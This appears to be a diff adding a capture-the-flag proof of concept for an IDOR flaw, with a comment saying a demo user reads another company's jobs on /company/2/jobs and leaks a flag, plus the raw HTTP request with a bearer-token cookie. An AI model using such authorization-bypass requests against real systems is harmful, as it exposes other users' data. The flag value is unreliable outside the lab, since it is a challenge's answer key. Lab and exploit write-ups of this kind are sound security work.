@@ -1,0 +1,5 @@
+# IDOR on /company/{company_id}/jobs - demo user (company_id=1) accesses company_id=2, leaking secret job entry with CTF flag: flag{cfbc7583-4a96-4662-835b-81c9f5317b56}
+
+GET /company/2/jobs HTTP/1.1
+Host: 172.17.0.1:58523
+Cookie: access_token=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzc2MDMyMTI2fQ.UbLllCpNhSFIH71hGIM4pDaFiXnWLt_a0e2rgWWoXho
